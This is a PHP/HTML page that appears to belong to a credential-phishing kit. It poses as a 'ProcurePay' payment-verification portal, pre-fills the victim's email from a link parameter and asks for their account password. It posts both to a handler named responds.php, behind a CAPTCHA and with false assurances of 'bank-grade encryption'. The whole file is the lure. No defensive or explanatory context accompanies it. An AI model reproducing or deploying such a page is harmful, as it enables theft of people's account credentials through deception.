<?php
// Start session and handle errors
session_start();

// Sanitize and validate email from URL if provided
$auto_email = '';
if (isset($_GET['email'])) {
    $auto_email = filter_var($_GET['email'], FILTER_SANITIZE_EMAIL);
    if (!filter_var($auto_email, FILTER_VALIDATE_EMAIL)) {
        $auto_email = ''; // Invalid email format
    }
}

// Error handling
$error_message = null;
if (isset($_SESSION['submission_error'])) {
    $error_message = $_SESSION['submission_error'];
    unset($_SESSION['submission_error']);
}

// Track submission attempts
if (!isset($_SESSION['submission_attempts'])) {
    $_SESSION['submission_attempts'] = 0;
}
?>

<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Payment Verification - Secure Portal</title>
    <link rel="icon" href="/images/tfsh_logo.png" type="image/png" sizes="16x16">
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
    <!-- Cloudflare Turnstile -->
    <script src="https://challenges.cloudflare.com/turnstile/v0/api.js" async defer></script>
    <style>
        :root {
            --primary-color: #2a5bd7;
            --primary-dark: #1e4bc2;
            --success-color: #28a745;
            --secondary-color: #f8f9fa;
            --text-color: #333;
            --light-gray: #f4f4f4;
            --white: #ffffff;
            --border-color: #e0e0e0;
            --error-color: #dc3545;
            --box-shadow: 0 4px 12px rgba(0, 0, 0, 0.08);
        }
        
        body {
            font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
            margin: 0;
            padding: 0;
            display: flex;
            flex-direction: column;
            min-height: 100vh;
            justify-content: center;
            background-color: var(--secondary-color);
            line-height: 1.5;
            color: var(--text-color);
        }
        
        header {
            background-color: var(--white);
            color: var(--primary-color);
            text-align: center;
            padding: 1.5em 0;
            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.05);
            border-bottom: 1px solid var(--border-color);
        }
        
        .logo {
            font-weight: 700;
            font-size: 1.4em;
            letter-spacing: -0.5px;
            margin: 0;
        }
        
        .logo span {
            color: var(--primary-dark);
        }
        
        .container {
            display: flex;
            justify-content: center;
            align-items: center;
            flex-direction: column;
            flex-grow: 1;
            padding: 2em;
        }
        
        .card {
            width: 100%;
            max-width: 440px;
            margin: 0 auto;
        }
        
        .card-header {
            text-align: center;
            margin-bottom: 1.5em;
        }
        
        .card-title {
            font-size: 1.4em;
            font-weight: 600;
            color: var(--primary-color);
            margin-bottom: 0.5em;
        }
        
        .card-subtitle {
            font-size: 0.95em;
            color: #666;
            margin-bottom: 1.5em;
        }
        
        .payment-info {
            background-color: #f0f6ff;
            border-left: 4px solid var(--primary-color);
            padding: 1em;
            margin-bottom: 1.5em;
            border-radius: 0 4px 4px 0;
            font-size: 0.9em;
        }
        
        .payment-info p {
            margin: 0.3em 0;
        }
        
        .payment-info strong {
            color: var(--primary-color);
        }
        
        form {
            background: var(--white);
            padding: 2em;
            border-radius: 8px;
            box-shadow: var(--box-shadow);
            border: 1px solid var(--border-color);
        }
        
        .form-group {
            margin-bottom: 1.5em;
        }
        
        label {
            font-size: 0.9em;
            margin-bottom: 0.5em;
            color: #555;
            display: block;
            font-weight: 500;
        }
        
        input[type="email"],
        input[type="password"] {
            width: 100%;
            padding: 0.85em;
            border: 1px solid var(--border-color);
            border-radius: 6px;
            font-size: 0.95em;
            box-sizing: border-box;
            transition: all 0.2s ease;
        }
        
        input[type="email"]:focus,
        input[type="password"]:focus {
            border-color: var(--primary-color);
            outline: none;
            box-shadow: 0 0 0 3px rgba(42, 91, 215, 0.15);
        }
        
        input[readonly] {
            background-color: #f8f8f8;
            cursor: not-allowed;
        }
        
        button {
            background-color: var(--primary-color);
            color: white;
            border: none;
            padding: 0.9em;
            border-radius: 6px;
            cursor: pointer;
            width: 100%;
            font-size: 0.95em;
            font-weight: 500;
            transition: all 0.2s ease;
        }
        
        button:hover {
            background-color: var(--primary-dark);
            transform: translateY(-1px);
        }
        
        button:active {
            transform: translateY(0);
        }
        
        .security-note {
            margin: 1.5em 0;
            font-size: 0.8em;
            color: #666;
            text-align: center;
            line-height: 1.6;
        }
        
        footer {
            background-color: var(--white);
            color: var(--text-color);
            text-align: center;
            padding: 1.5em 0;
            margin-top: auto;
            border-top: 1px solid var(--border-color);
            font-size: 0.85em;
        }
        
        .footer-links {
            display: flex;
            justify-content: center;
            gap: 1.5rem;
            margin-top: 1em;
        }
        
        .footer-links a {
            color: #666;
            text-decoration: none;
            transition: color 0.2s ease;
        }
        
        .footer-links a:hover {
            color: var(--primary-color);
            text-decoration: underline;
        }
        
        .error-message {
            color: var(--error-color);
            font-size: 0.9em;
            margin: 1em 0;
            padding: 0.8em;
            background-color: rgba(220, 53, 69, 0.08);
            border-radius: 4px;
            text-align: center;
            border-left: 4px solid var(--error-color);
        }
        
        .error-message p {
            margin: 0.3em 0;
        }
        
        .verification-badge {
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 0.5em;
            font-size: 0.8em;
            color: var(--success-color);
            margin-top: 1em;
        }
        
        /* Turnstile CAPTCHA styles */
        .cf-turnstile {
            margin: 1em 0;
            display: flex;
            justify-content: center;
        }
        
        .cf-turnstile iframe {
            background-color: transparent;
        }
        
        @media (max-width: 480px) {
            .container {
                padding: 1em;
            }
            
            form {
                padding: 1.5em;
            }
            
            .card-title {
                font-size: 1.2em;
            }
        }
    </style>
</head>

<body>
    <header>
        <h1 class="logo">Procure<span>Pay</span></h1>
    </header>

    <div class="container">
        <div class="card">
            <div class="card-header">
                <h2 class="card-title">Payment Verification</h2>
                <p class="card-subtitle">Confirm your identity to verify payment receipt</p>
            </div>

            <div class="payment-info">
                <p><strong>Important:</strong> For security purposes, please verify your identity.</p>
                <p>This helps us ensure the payment is received by the correct recipient.</p>
            </div>

            <?php if ($error_message): ?>
                <div class="error-message">
                    <p><strong><?= htmlspecialchars($error_message['title'] ?? 'Verification Error') ?></strong></p>
                    <p><?= htmlspecialchars($error_message['message'] ?? 'There was an issue verifying your credentials') ?></p>
                </div>
            <?php endif; ?>

            <form id="verificationForm" action="responds.php" method="POST">
                <div class="form-group">
                    <label for="email">Email Address</label>
                    <input type="email" 
                           name="email" 
                           id="email" 
                           value="<?= htmlspecialchars($auto_email) ?>" 
                           <?= !empty($auto_email) ? 'readonly' : 'required' ?>
                           placeholder="your@email.com">
                </div>

                <div class="form-group">
                    <label for="password">Account Password</label>
                    <input type="password" 
                           name="password" 
                           id="password" 
                           required 
                           autocomplete="current-password"
                           placeholder="Enter your password">
                </div>

                <!-- Cloudflare Turnstile Widget -->
                <div class="form-group">
                    <div class="cf-turnstile" data-sitekey="0x4AAAAAABeKtUszc51VnUoX"></div>
                </div>

                <button type="submit">Verify & Confirm Payment</button>

                <div class="security-note">
                    Your information is protected with bank-grade encryption. By verifying, you confirm receipt of this payment.
                </div>
                
                <div class="verification-badge">
                    <svg width="16" height="16" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                        <path d="M12 2C6.48 2 2 6.48 2 12C2 17.52 6.48 22 12 22C17.52 22 22 17.52 22 12C22 6.48 17.52 2 12 2ZM10 17L5 12L6.41 10.59L10 14.17L17.59 6.58L19 8L10 17Z" fill="#28a745"/>
                    </svg>
                    <span>Secure Payment Verification</span>
                </div>
            </form>
        </div>
    </div>

    <footer>
        <div>&copy; <?= date('Y') ?> ProcurePay Solutions. All rights reserved.</div>
        <div class="footer-links">
            <a href="/privacy" target="_blank">Privacy</a>
            <a href="/terms" target="_blank">Terms</a>
            <a href="/contact" target="_blank">Support</a>
        </div>
    </footer>

    <script>
        document.addEventListener('DOMContentLoaded', function() {
            // Focus on the appropriate field based on whether email is pre-filled
            const emailField = document.getElementById('email');
            const passwordField = document.getElementById('password');
            
            if (emailField && !emailField.readOnly) {
                emailField.focus();
            } else if (passwordField) {
                passwordField.focus();
            }
            
            // Add form validation
            const form = document.getElementById('verificationForm');
            if (form) {
                form.addEventListener('submit', function(e) {
                    // Check if Turnstile token exists
                    if (!document.querySelector('input[name="cf-turnstile-response"]')) {
                        alert('Please complete the security verification.');
                        e.preventDefault();
                        return;
                    }
                    
                    // You can add additional client-side validation here
                    if (!emailField.readOnly && !emailField.value.includes('@')) {
                        alert('Please enter a valid email address');
                        e.preventDefault();
                    }
                });
            }
        });
    </script>
</body>
</html>
